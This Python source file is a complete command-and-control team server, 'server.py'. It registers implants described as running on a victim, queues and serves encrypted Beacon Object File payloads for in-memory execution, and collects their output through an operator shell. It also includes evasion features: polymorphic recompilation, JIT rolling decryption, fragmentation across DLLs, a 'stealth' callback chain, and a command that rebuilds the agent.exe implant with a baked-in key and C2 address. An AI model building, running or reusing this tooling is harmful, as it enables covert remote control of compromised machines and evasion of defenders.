#!/usr/bin/env python3
"""
server.py - BOF C2 Team Server with Operator Shell

Architecture:
    - HTTP listener on 0.0.0.0:8080
    - Endpoints:
        POST /checkin         -> agent polls for tasks
        GET  /bof/<name>      -> download BOF .o file
        POST /result          -> agent posts BOF output
    - Operator REPL shell:
        list                       - list connected agents
        use <agent_id>             - select active agent
        bof_exec <name>            - queue BOF for execution
        bofs                       - list available BOFs (from bofs/ dir)
        status                     - show current state
        help                       - show commands
        exit                       - quit server

Real-world flow:
    1. Operator starts server:   python server.py
    2. Agent.exe runs on victim, connects to this server
    3. Server registers agent, operator sees it in 'list'
    4. Operator: use WIN_BOT_001
    5. Operator: bof_exec bof_whoami
    6. Agent beacons in, gets task, downloads BOF, executes in-memory
    7. Agent POSTs result -> operator sees output in shell
"""

import os
import sys
import json
import time
import base64
import threading
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

# ---------- config ----------
HOST        = "0.0.0.0"
PORT        = 8080
BOFS_DIR    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "bofs")
DIST_DIR    = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "dist")

# Fix BOFS_DIR if running from server/ subdirectory
if not os.path.isdir(BOFS_DIR):
    BOFS_DIR = os.path.join(os.getcwd(), "bofs")
if not os.path.isdir(DIST_DIR):
    DIST_DIR = os.path.join(os.getcwd(), "dist")

# ---------- global state ----------
AGENTS_LOCK  = threading.Lock()
AGENTS       = {}        # id -> { last_seen, tasks: [(task_id, bof_name)], results: [] }
SELECTED     = [None]    # currently selected agent ID (list for mutability in closure)

# Phase 3: Per-session crypto state
SESSION_CRYPTO = {"psk": None, "keys": None, "salt": None}

# Build-time PSK (32 bytes hex) — must match agent's CRYPTO_PSK_HEX
# Try to load PSK from .bof_psk file (persists across server restarts)
# If not found, generate new PSK and save it
PSK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".bof_psk")
PSK_HEX = None

def load_or_generate_psk():
    """Load PSK from file, or generate new one and save it."""
    global PSK_HEX
    # Try to load existing PSK
    if os.path.isfile(PSK_FILE):
        with open(PSK_FILE, 'r') as f:
            PSK_HEX = f.read().strip()
        if len(PSK_HEX) == 64:  # 32 bytes hex
            print(f"[*] Loaded existing PSK from {PSK_FILE}")
            return

    # Generate new PSK and save
    import secrets as _secrets
    PSK_HEX = _secrets.token_hex(32)
    with open(PSK_FILE, 'w') as f:
        f.write(PSK_HEX)
    print(f"[*] Generated new PSK and saved to {PSK_FILE}")

load_or_generate_psk()
print(f"[*] Session PSK (hex): {PSK_HEX}")


# ============================================================
#  HTTP handler - serves agent <-> server comms
# ============================================================
class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        # Silence default HTTP logging (we print our own messages)
        pass

    def _send_json(self, code, obj):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_bytes(self, code, data, ctype="application/octet-stream"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):
        path = self.path.split("?")[0]

        if path == "/checkin":
            body = self._read_body()
            try:
                data = json.loads(body)
                agent_id = data.get("id", "unknown")
                salt_b64 = data.get("salt", "")  # Phase 3: per-session salt
            except Exception:
                return self._send_json(400, {"error": "bad json"})

            # Phase 3: Derive crypto keys if salt provided
            if salt_b64 and SESSION_CRYPTO["keys"] is None:
                try:
                    salt = base64.b64decode(salt_b64)
                    if len(salt) == 32:
                        from bof_crypto import derive_keys
                        psk = bytes.fromhex(PSK_HEX)
                        keys = derive_keys(psk, salt)
                        SESSION_CRYPTO["psk"] = psk
                        SESSION_CRYPTO["salt"] = salt
                        SESSION_CRYPTO["keys"] = keys
                        print(f"[+] Crypto established (HKDF derived 4 keys)")
                        print(f"    Salt: {salt.hex()[:32]}...")
                        print(f"    traffic_key: {keys['traffic_key'].hex()[:32]}...")
                except Exception as e:
                    print(f"[!] Crypto init failed: {e}")

            with AGENTS_LOCK:
                if agent_id not in AGENTS:
                    AGENTS[agent_id] = {
                        "first_seen": time.time(),
                        "last_seen":  time.time(),
                        "tasks":      [],
                        "results":    [],
                    }
                    print(f"\n[+] NEW AGENT REGISTERED: {agent_id}")
                else:
                    AGENTS[agent_id]["last_seen"] = time.time()

                agent = AGENTS[agent_id]

                # Pop next task if any
                if agent["tasks"]:
                    # tasks are now: (task_id, bof_name, args_b64)
                    task_entry = agent["tasks"].pop(0)
                    task_id = task_entry[0]
                    bof_name = task_entry[1]
                    args_b64 = task_entry[2] if len(task_entry) > 2 else ""
                    print(f"[>] Sent task {task_id} ({bof_name}) to {agent_id}")
                    return self._send_json(200, {
                        "task_id": task_id,
                        "bof":     bof_name,
                        "args":    args_b64,
                    })
                else:
                    return self._send_json(200, {})

        elif path == "/result":
            body = self._read_body()
            try:
                data = json.loads(body)
                agent_id = data.get("id")
                task_id  = data.get("task_id", "?")
                output_b64 = data.get("output_b64", "")
                exit_code = data.get("exit", -1)
            except Exception:
                return self._send_json(400, {"error": "bad json"})

            try:
                output = base64.b64decode(output_b64).decode("utf-8", errors="replace")
            except Exception:
                output = f"<base64 decode failed, raw len={len(output_b64)}>"

            with AGENTS_LOCK:
                if agent_id in AGENTS:
                    AGENTS[agent_id]["results"].append({
                        "task_id": task_id,
                        "output":  output,
                        "exit":    exit_code,
                        "ts":      time.time(),
                    })

            # Print result to operator shell
            print()
            print("=" * 60)
            print(f"  RESULT from {agent_id} (task={task_id}, exit={exit_code})")
            print("=" * 60)
            print(output)
            print("=" * 60)
            print(f"operator> ", end="", flush=True)
            return self._send_json(200, {"ok": True})

        else:
            return self._send_json(404, {"error": "not found"})

    def do_GET(self):
        path = self.path.split("?")[0]

        if path.startswith("/bof/"):
            name = path[5:]   # strip /bof/
            # Search both bofs/ and dist/ for the file
            search_dirs = [DIST_DIR, BOFS_DIR]
            found = None
            for d in search_dirs:
                p = os.path.join(d, name)
                if os.path.isfile(p):
                    found = p
                    break
            if not found:
                print(f"[!] BOF not found: {name}")
                return self._send_json(404, {"error": "bof not found"})
            with open(found, "rb") as f:
                data = f.read()

            # Phase 3: Encrypt BOF payload before sending
            # Uses traffic_key + mac_key from per-session crypto
            if SESSION_CRYPTO.get("keys"):
                keys = SESSION_CRYPTO["keys"]
                from bof_crypto import encrypt_payload
                encrypted = encrypt_payload(data, keys["traffic_key"], keys["mac_key"])
                # Wire format: [4B length][12B nonce][ciphertext+tag]
                import struct
                wire = struct.pack(">I", len(encrypted)) + encrypted
                print(f"[>] Served BOF {name} ({len(data)} bytes → {len(wire)} encrypted)")
                return self._send_bytes(200, wire, "application/octet-stream")
            else:
                # No crypto (legacy mode) - send plaintext
                print(f"[>] Served BOF {name} ({len(data)} bytes, plaintext)")
                return self._send_bytes(200, data)

        return self._send_json(404, {"error": "not found"})

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        if length == 0:
            return b""
        return self.rfile.read(length)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


# ============================================================
#  Operator shell (runs in main thread)
# ============================================================
def list_bofs():
    """List .o files in dist/ and bofs/ directories."""
    files = set()
    for d in [DIST_DIR, BOFS_DIR]:
        if not os.path.isdir(d):
            continue
        for f in os.listdir(d):
            if f.endswith(".x64.o") or f.endswith(".o"):
                files.add(f)
    return sorted(files)


def pack_bof_args(args):
    """Pack string/int args into binary format for BOF.

    Format matches Cobalt Strike convention:
    - Strings: [4 bytes: length including null][string bytes + null]
    - Ints:    [4 bytes: int value (little-endian)]

    The BOF reads these via BeaconDataExtract (for strings) or
    BeaconDataInt (for ints), in the order they appear.
    """
    import struct
    blob = b""
    for arg in args:
        # Try to parse as integer
        try:
            val = int(arg)
            blob += struct.pack("<i", val)
        except ValueError:
            # Treat as string (CS convention: length-prefixed with null)
            s = arg.encode("utf-8") + b"\x00"
            blob += struct.pack("<I", len(s)) + s
    return blob


def resolve_bof_name(short_name):
    """Resolve short BOF name to full .o filename.

    Examples:
      sysinfo         → sysinfo.x64.o
      env             → env.x64.o
      clipboard_dump  → clipboard_dump.x64.o

    Also accepts full names:
      sysinfo.x64.o → sysinfo.x64.o
    """
    # If already ends with .o, use as-is
    if short_name.endswith(".o"):
        return short_name
    # Otherwise: append .x64.o
    return f"{short_name}.x64.o"


def cmd_list():
    with AGENTS_LOCK:
        if not AGENTS:
            print("  (no agents connected)")
            return
        now = time.time()
        print(f"  {'Agent ID':<20}  {'Last Seen':<8}  {'Pending Tasks'}")
        print(f"  {'-'*20}  {'-'*8}  {'-'*13}")
        for aid, info in AGENTS.items():
            ago = int(now - info["last_seen"])
            pending = len(info["tasks"])
            sel = " *" if SELECTED[0] == aid else "  "
            print(f"{sel}{aid:<20}  {ago:>5}s ago  {pending:>13}")


def cmd_use(args):
    if not args:
        print("  usage: use <agent_id>")
        return
    aid = args[0]
    with AGENTS_LOCK:
        if aid not in AGENTS:
            print(f"  [!] Agent '{aid}' not connected.")
            print(f"      Connected agents: {', '.join(AGENTS.keys()) or 'none'}")
            return
    SELECTED[0] = aid
    print(f"  [+] Selected agent: {aid}")


def cmd_bof_exec(args):
    """Legacy command — alias for un_bof (kept for backward compatibility)."""
    cmd_un_bof(args)


def cmd_un_bof(args):
    """Primary BOF execution command.

    Syntax:
      un_bof <name> [arg1] [arg2] ...

    Examples:
      un_bof whoami
      un_bof greet John
      un_bof greet "Hello World" 3

    <name> can be:
      whoami          → resolves to bof_whoami.x64.o
      bof_whoami      → resolves to bof_whoami.x64.o
      bof_whoami.x64.o → used as-is

    Arguments are auto-typed:
      - If arg parses as integer → sent as int (4 bytes, little-endian)
      - Otherwise → sent as length-prefixed string (CS convention)
    """
    if not args:
        print("  usage: un_bof <name> [arg1] [arg2] ...")
        print("  examples:")
        print("    un_bof whoami")
        print("    un_bof greet John")
        print("    un_bof greet 'Hello World' 3")
        return

    short_name = args[0]
    stealth_mode = '--stealth' in args

    # Remove --stealth and --frag from args (they're not BOF arguments)
    bof_args = [a for a in args[1:] if a not in ('--stealth',)]

    # Also remove --frag and its value
    if '--frag' in bof_args:
        idx = bof_args.index('--frag')
        bof_args = bof_args[:idx] + bof_args[idx+2:]

    # Resolve BOF name
    bof_name = resolve_bof_name(short_name)

    # Determine which version to use
    # Priority: --stealth (chain) > JIT > fragment > normal .o
    if stealth_mode:
        # Look for .chain.bin
        chain_name = f"{short_name}.chain.bin"
        chain_path = None
        for d in [DIST_DIR, BOFS_DIR]:
            p = os.path.join(d, chain_name)
            if os.path.isfile(p):
                chain_path = p
                break
        if chain_path:
            bof_name = chain_name
            bof_path = chain_path
            print(f"  [*] Layer C: Using chain-compiled version: {chain_name}")
        else:
            print(f"  [!] No chain-compiled version found for '{short_name}'")
            print(f"      Run: pjfc_bof {short_name} --stealth")
            return
    else:
        # Check for JIT, fragment, or normal .o
        # Layer B: Check if a JIT-encrypted version exists
        jit_name = f"{short_name}.jit.bin"
        jit_path = None
        for d in [DIST_DIR, BOFS_DIR]:
            p = os.path.join(d, jit_name)
            if os.path.isfile(p):
                jit_path = p
                break

        # Layer A: Check if a fragmented version exists
        packed_name = f"{short_name}.packed.bin"
        packed_path = None
        for d in [DIST_DIR, BOFS_DIR]:
            p = os.path.join(d, packed_name)
            if os.path.isfile(p):
                packed_path = p
                break

        if jit_path:
            bof_name = jit_name
            bof_path = jit_path
            print(f"  [*] Layer B: Using JIT-encrypted version: {jit_name}")
        elif packed_path:
            bof_name = packed_name
            bof_path = packed_path
            print(f"  [*] Layer A: Using fragmented version: {packed_name}")
        else:
            # Use normal .o file
            bof_path = None
            for d in [DIST_DIR, BOFS_DIR]:
                p = os.path.join(d, bof_name)
                if os.path.isfile(p):
                    bof_path = p
                    break
            if not bof_path:
                print(f"  [!] BOF '{bof_name}' not found")
                print(f"      Available BOFs:")
                for b in list_bofs():
                    short = b.replace("bof_", "").replace(".x64.o", "")
                    print(f"        - {short:15} ({b})")
                return

    # Auto-select agent if needed
    if not SELECTED[0]:
        with AGENTS_LOCK:
            if len(AGENTS) == 1:
                SELECTED[0] = list(AGENTS.keys())[0]
                print(f"  [+] Auto-selected agent: {SELECTED[0]}")
            else:
                print("  [!] No agent selected. Use 'list' to see agents, then 'use <id>'.")
                return

    # Pack arguments (if any)
    args_b64 = ""
    if bof_args:
        args_blob = pack_bof_args(bof_args)
        args_b64 = base64.b64encode(args_blob).decode("ascii")
        print(f"  [*] Packed {len(bof_args)} arg(s) → {len(args_blob)} bytes (b64: {len(args_b64)})")

    # Queue task
    with AGENTS_LOCK:
        if SELECTED[0] not in AGENTS:
            print(f"  [!] Agent '{SELECTED[0]}' no longer connected.")
            SELECTED[0] = None
            return
        task_id = f"t{int(time.time())}"
        # Task is now a 3-tuple: (task_id, bof_name, args_b64)
        AGENTS[SELECTED[0]]["tasks"].append((task_id, bof_name, args_b64))
        print(f"  [+] Queued: {bof_name}")
        if bof_args:
            print(f"      Args: {bof_args}")
        print(f"      Task: {task_id} → Agent: {SELECTED[0]}")
        print(f"      Agent will pick it up on next beacon.")


def cmd_sync_psk(args):
    """Rebuild agent.exe with current PSK (Phase 3 crypto sync).

    This reads the current PSK from .bof_psk and rebuilds agent.exe
    so it has the same PSK baked in. Run this once after server starts.

    Usage:
      sync_psk [C2_HOST] [C2_PORT]

    Example:
      sync_psk 192.168.81.128 8080
    """
    c2_host = args[0] if len(args) > 0 else "192.168.81.128"
    c2_port = args[1] if len(args) > 1 else "8080"

    print(f"  [*] Rebuilding agent.exe with PSK: {PSK_HEX[:16]}...")

    # Find build.sh
    script_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.dirname(script_dir)
    build_sh = os.path.join(project_dir, "build.sh")

    if not os.path.isfile(build_sh):
        print(f"  [!] build.sh not found at: {build_sh}")
        return

    # Modify build.sh to inject PSK
    # We'll use an environment variable approach
    import subprocess

    # Read current build.sh
    with open(build_sh) as f:
        build_content = f.read()

    # Check if build.sh already has CRYPTO_PSK_HEX support
    if "CRYPTO_PSK_HEX" not in build_content:
        # Add -DCRYPTO_PSK_HEX to the CFLAGS_ARGS array
        old_line = '    -DAGENT_ID="\\"$AGENT_ID\\""'
        new_line = old_line + f'\n    -DCRYPTO_PSK_HEX="\\"{PSK_HEX}\\""'
        build_content = build_content.replace(old_line, new_line)
        with open(build_sh, 'w') as f:
            f.write(build_content)
        print(f"  [+] Patched build.sh with CRYPTO_PSK_HEX")
    else:
        # Update existing PSK in build.sh
        import re
        build_content = re.sub(
            r'-DCRYPTO_PSK_HEX=\\"\\"[^"]*\\"\\"',
            f'-DCRYPTO_PSK_HEX="\\"{PSK_HEX}\\""',
            build_content
        )
        # Also handle the simpler form
        build_content = re.sub(
            r'-DCRYPTO_PSK_HEX=\\?"[^"]*\\?"',
            f'-DCRYPTO_PSK_HEX="\\"{PSK_HEX}\\""',
            build_content
        )
        with open(build_sh, 'w') as f:
            f.write(build_content)
        print(f"  [+] Updated PSK in build.sh")

    # Now run build.sh
    print(f"  [*] Running: ./build.sh {c2_host} {c2_port}")
    print()
    result = subprocess.run(
        ["bash", build_sh, c2_host, c2_port],
        cwd=project_dir,
        capture_output=True,
        text=True
    )
    print(result.stdout)
    if result.returncode != 0:
        print(f"  [!] Build failed:")
        print(result.stderr)
    else:
        # Verify agent.exe was built
        agent_exe = os.path.join(project_dir, "dist", "agent.exe")
        if os.path.isfile(agent_exe):
            sz = os.path.getsize(agent_exe)
            print(f"  [+] agent.exe rebuilt: {sz} bytes")
            print(f"  [+] PSK baked in: {PSK_HEX[:32]}...")
            print(f"  [+] Copy dist/agent.exe to Windows target")
        else:
            print(f"  [!] agent.exe not found after build")
    print()


def cmd_pjfc_bof(args):
    """Pre-compile BOF with full chain (Layer C).

    Combines: polymorphic + JIT + fragmentation + callback chain.

    Usage:
      pjfc_bof <name> [--stealth] [--frag N]

    Examples:
      pjfc_bof whoami --stealth --frag 4
      pjfc_bof whoami --stealth         (default 3 fragments)
      pjfc_bof whoami --frag 5
      pjfc_bof whoami                   (default 3 fragments)

    Creates a .chain.bin that executes across multiple DLLs
    with different callbacks per phase.
    """
    if not args:
        print("  usage: pjfc_bof <name> [--stealth] [--frag N]")
        print("  examples:")
        print("    pjfc_bof whoami --stealth --frag 4")
        print("    pjfc_bof whoami --stealth")
        print("    pjfc_bof whoami")
        return

    short_name = args[0]
    use_stealth = '--stealth' in args
    use_poly = use_stealth  # stealth implies poly

    # Parse --frag
    frag_count = 3  # default
    if '--frag' in args:
        idx = args.index('--frag')
        if idx + 1 < len(args):
            try:
                frag_count = int(args[idx + 1])
            except ValueError:
                pass

    # Resolve BOF
    bof_name = resolve_bof_name(short_name)

    # Find .o file
    bof_path = None
    for d in [DIST_DIR, BOFS_DIR]:
        p = os.path.join(d, bof_name)
        if os.path.isfile(p):
            bof_path = p
            break
    if not bof_path:
        print(f"  [!] BOF '{bof_name}' not found")
        return

    # Output path
    chain_path = os.path.join(DIST_DIR, f"{short_name}.chain.bin")

    print(f"  [*] Chain compiling: {bof_name}")
    print(f"      Fragments: {frag_count}")
    print(f"      Polymorphic: {use_poly}")
    print(f"      JIT: YES (always)")
    print(f"      Callback chain: {frag_count} phases")
    print()

    try:
        from chain_compiler import create_chain_bof
        result = create_chain_bof(bof_path, chain_path,
                                    num_fragments=frag_count,
                                    use_poly=use_poly, verbose=True)
        print(f"\n  [+] Chain compilation complete!")
        print(f"      Output: {chain_path}")
        print(f"      Size: {result['size']} bytes")
        print(f"      Phases: {result['fragments']}")
        print(f"\n  [*] Execute with: un_bof {short_name} --stealth")
    except Exception as e:
        print(f"  [!] Chain compilation failed: {e}")
        import traceback
        traceback.print_exc()


def cmd_jit_bof(args):
    """JIT-encrypt a BOF for rolling decryption execution (Layer B).

    Usage:
      jit_bof <name>

    Example:
      jit_bof whoami

    Creates a JIT-encrypted .jit.bin file.
    The agent's JIT engine decrypts chunks at runtime.
    """
    if not args:
        print("  usage: jit_bof <name>")
        print("  examples:")
        print("    jit_bof whoami")
        return

    short_name = args[0]
    bof_name = resolve_bof_name(short_name)

    # Find the .o file
    bof_path = None
    for d in [DIST_DIR, BOFS_DIR]:
        p = os.path.join(d, bof_name)
        if os.path.isfile(p):
            bof_path = p
            break
    if not bof_path:
        print(f"  [!] BOF '{bof_name}' not found")
        return

    # Output path
    jit_path = os.path.join(DIST_DIR, f"{short_name}.jit.bin")

    print(f"  [*] JIT encrypting: {bof_name}")
    print(f"      Source: {bof_path}")
    print(f"      Output: {jit_path}")

    try:
        from jit_encryptor import create_jit_bof
        result = create_jit_bof(bof_path, jit_path, verbose=True)
        print(f"\n  [+] JIT encryption complete!")
        print(f"      Size: {result['size']} bytes")
        print(f"      Text size: {result['text_size']} bytes")
        print(f"      Chunk size: {result['chunk_size']} bytes")
        print(f"\n  [*] Use 'un_bof {short_name}' to execute (auto-detects JIT)")
    except Exception as e:
        print(f"  [!] JIT encryption failed: {e}")
        import traceback
        traceback.print_exc()


def cmd_fragment_bof(args):
    """Fragment a BOF into N pieces for multi-DLL loading (Layer A).

    Usage:
      fragment_bof <name> [num_fragments]

    Example:
      fragment_bof whoami        # default 3 fragments
      fragment_bof whoami 5     # 5 fragments

    Creates a packed.bin containing all fragments.
    The agent's fragment_loader scatters these across multiple DLLs.
    """
    if not args:
        print("  usage: fragment_bof <name> [num_fragments]")
        print("  examples:")
        print("    fragment_bof whoami")
        print("    fragment_bof whoami 5")
        return

    short_name = args[0]
    num_frags = int(args[1]) if len(args) > 1 else 3

    # Resolve BOF name
    bof_name = resolve_bof_name(short_name)

    # Find the .o file
    bof_path = None
    for d in [DIST_DIR, BOFS_DIR]:
        p = os.path.join(d, bof_name)
        if os.path.isfile(p):
            bof_path = p
            break
    if not bof_path:
        print(f"  [!] BOF '{bof_name}' not found")
        return

    # Output directory for fragments
    frag_dir = os.path.join(DIST_DIR, f"frag_{short_name}")
    packed_path = os.path.join(DIST_DIR, f"{short_name}.packed.bin")

    print(f"  [*] Fragmenting: {bof_name}")
    print(f"      Source: {bof_path}")
    print(f"      Fragments: {num_frags}")
    print(f"      Output: {frag_dir}")

    try:
        from fragment_compiler import fragment_bof, pack_fragments
        manifest = fragment_bof(bof_path, frag_dir,
                                  num_fragments=num_frags, verbose=True)
        pack_fragments(packed_path, frag_dir, verbose=True)
        print(f"\n  [+] Fragmentation complete!")
        print(f"      Packed binary: {packed_path}")
        print(f"      Size: {os.path.getsize(packed_path)} bytes")
        print(f"      Fragments: {manifest['total_fragments']}")
        print(f"\n  [*] Use 'un_bof {short_name}' to execute (auto-detects fragmented)")
    except Exception as e:
        print(f"  [!] Fragmentation failed: {e}")
        import traceback
        traceback.print_exc()


def cmd_poly_bof(args):
    if not args:
        print("  usage: poly_bof <name> [--simple]")
        print("  examples:")
        print("    poly_bof whoami")
        print("    poly_bof whoami --simple")
        return

    short_name = args[0]
    use_simple = len(args) > 1 and args[1] == "--simple"

    # Resolve source path
    # Accept: whoami, bof_whoami, bof_whoami.c
    if short_name.endswith(".c"):
        src_name = short_name
    elif short_name.startswith("bof_"):
        src_name = short_name + ".c"
    else:
        src_name = f"bof_{short_name}.c"

    src_path = os.path.join(BOFS_DIR, src_name)
    if not os.path.isfile(src_path):
        print(f"  [!] Source not found: {src_path}")
        return

    # Output to dist/
    out_name = src_name.replace(".c", ".x64.o")
    out_path = os.path.join(DIST_DIR, out_name)

    print(f"  [*] Compiling: {src_name}")
    print(f"      Source: {src_path}")
    print(f"      Output: {out_path}")

    try:
        from polymorphic_compile import compile_bof_polymorphic, compile_bof_simple
        import random
        rng = random.Random()  # fresh random each compile

        if use_simple:
            metadata = compile_bof_simple(src_path, out_path, verbose=True)
            print(f"  [+] Simple compile done: {metadata['final_size']} bytes")
        else:
            metadata = compile_bof_polymorphic(src_path, out_path,
                                                 rng=rng, verbose=True)
            applied = sum(1 for t in metadata["transformations"] if t.get("applied"))
            print(f"  [+] Polymorphic compile done!")
            print(f"      Transformations applied: {applied}/5")
            print(f"      Final size: {metadata['final_size']} bytes")
            if metadata.get("fallback"):
                print(f"      [!] Used fallback (mutation may have failed)")
    except Exception as e:
        print(f"  [!] Compile failed: {e}")
        import traceback
        traceback.print_exc()


def cmd_bofs():
    files = list_bofs()
    if not files:
        print("  (no .o files found)")
        print(f"  Tip: run ./bof_compile.sh to build BOFs from bofs/*.c")
        return
    print(f"  Available BOFs ({len(files)}):")
    for f in files:
        # Find size
        sz = 0
        for d in [DIST_DIR, BOFS_DIR]:
            p = os.path.join(d, f)
            if os.path.isfile(p):
                sz = os.path.getsize(p)
                break
        print(f"    - {f}  ({sz} bytes)")


def cmd_status():
    print(f"  Server           : {HOST}:{PORT}")
    print(f"  BOFs dir         : {BOFS_DIR}")
    print(f"  Dist dir         : {DIST_DIR}")
    with AGENTS_LOCK:
        print(f"  Connected agents : {len(AGENTS)}")
        print(f"  Selected agent   : {SELECTED[0] or '(none)'}")


def cmd_help():
    print("""
  Available commands:
    list                    - list connected agents
    use <agent_id>          - select active agent

    un_bof <name> [args...] - execute BOF (SHORT syntax!)
        un_bof whoami
        un_bof greet John
        un_bof greet "Hello World" 3

    bof_exec <name> [args]  - legacy alias for un_bof
    bofs                    - list available BOFs (short names)
    poly_bof <name>     - polymorphic compile (Phase 2)
                              produces different .o each time!
    fragment_bof <name> [N] - fragment BOF into N pieces (Layer A)
                                  scatters code across multiple DLLs
    jit_bof <name>       - JIT-encrypt BOF for rolling decryption (Layer B)
                              code never fully decrypted in memory
    pjfc_bof <name> [--stealth] [--frag N] - Pre-compile with FULL chain (Layer C)
                              combines poly + JIT + fragment + callback chain
                              use --frag N to specify fragment count (default 3)
    sync_psk [host] [port]  - rebuild agent.exe with current PSK
                              (run once after server starts)
    status                  - show server state
    help                    - this help
    exit                    - stop server and quit

  Argument auto-typing:
    Integers (e.g., 42) → sent as 4-byte int
    Strings  (e.g., John) → sent as length-prefixed string
""")


def operator_shell():
    """Main REPL loop running in main thread."""
    print()
    print("=" * 60)
    print(f"  BOF C2 Team Server - Operator Shell")
    print(f"  Listening on {HOST}:{PORT}")
    print("=" * 60)
    print()
    print("  Agent endpoints:")
    print(f"    POST /checkin    - agent polls for tasks")
    print(f"    GET  /bof/<name> - download BOF binary")
    print(f"    POST /result     - agent posts BOF output")
    print()
    print("  Type 'help' for commands, 'exit' to quit.")
    print()

    # If stdin is not a TTY (e.g. background process), just sleep forever
    # so the HTTP server can keep serving requests. Useful for testing.
    if not sys.stdin.isatty():
        print("[*] Running in non-interactive mode (stdin not a TTY)")
        print("[*] HTTP server will keep running. Kill process to stop.")
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            pass
        return

    while True:
        try:
            cmd_input = input("operator> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            print("[*] Shutting down server...")
            break
        if not cmd_input:
            continue

        parts   = cmd_input.split()
        cmd     = parts[0].lower()
        args    = parts[1:]

        if cmd in ("exit", "quit", "q"):
            print("[*] Shutting down server...")
            break
        elif cmd == "list":
            cmd_list()
        elif cmd == "use":
            cmd_use(args)
        elif cmd == "un_bof":
            # Use shlex to properly handle quoted args like "Hello World"
            import shlex
            try:
                parsed = shlex.split(cmd_input)
                # parsed[0] = "un_bof", rest are args
                cmd_un_bof(parsed[1:])
            except ValueError as e:
                print(f"  [!] Parse error: {e}")
        elif cmd == "bof_exec":
            # Legacy alias
            import shlex
            try:
                parsed = shlex.split(cmd_input)
                cmd_un_bof(parsed[1:])
            except ValueError as e:
                print(f"  [!] Parse error: {e}")
        elif cmd == "bofs":
            cmd_bofs()
        elif cmd == "poly_bof":
            cmd_poly_bof(args)
        elif cmd == "fragment_bof":
            cmd_fragment_bof(args)
        elif cmd == "jit_bof":
            cmd_jit_bof(args)
        elif cmd == "pjfc_bof":
            cmd_pjfc_bof(args)
        elif cmd == "sync_psk":
            cmd_sync_psk(args)
        elif cmd == "status":
            cmd_status()
        elif cmd == "help":
            cmd_help()
        else:
            print(f"  [!] Unknown command: {cmd}")
            print(f"      Type 'help' for available commands.")


# ============================================================
#  Entry point
# ============================================================
def main():
    # Start HTTP server in background thread
    httpd = ThreadedHTTPServer((HOST, PORT), Handler)
    server_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    server_thread.start()
    print(f"[*] HTTP listener started on {HOST}:{PORT}")

    # Run operator shell in main thread
    try:
        operator_shell()
    finally:
        httpd.shutdown()
        print("[*] Server stopped.")


if __name__ == "__main__":
    main()
